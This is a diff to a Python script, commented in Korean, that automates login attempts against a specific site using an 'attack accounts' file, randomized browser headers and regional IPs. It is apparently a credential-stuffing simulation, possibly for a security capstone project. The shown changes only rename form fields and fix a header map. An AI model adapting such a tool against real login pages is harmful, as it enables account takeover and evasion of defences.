@@ -8,8 +8,8 @@ from urllib.parse import urlparse
 LOGIN_URL = "https://capstone3d.dothome.co.kr/login_process.php"  # (예시)
 
 # 1-2. 로그인 폼 <input>의 'name' 속성 (HTML 소스 보기로 확인)
-ID_FIELD_NAME = "userid"  # (예시)
-PW_FIELD_NAME = "password"  # (예시)
+ID_FIELD_NAME = "loginId"  # (예시)
+PW_FIELD_NAME = "loginPassword"  # (예시)
 
 # 1-3. 공격용 계정 파일
 ACCOUNTS_FILE = "attack_accounts.csv"
@@ -44,7 +44,7 @@ ACCEPT_HEADERS_BY_BROWSER = {
     'chrome': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'firefox': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
     'safari': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-    None
+    'none': None
 }
 
 # --- 지역별 IP 및 언어 설정 (악성 IP 카테고리 추가) ---
@@ -162,8 +162,8 @@ try:
 
         # 1. 로그인 페이로드(폼 데이터) 생성
         payload = {
-            ID_FIELD_NAME: userid,
-            PW_FIELD_NAME: password
+            ID_FIELD_NAME: loginId,
+            PW_FIELD_NAME: loginPassword
         }
 
         # 2. 전송할 헤더 (실시간 랜덤 생성)
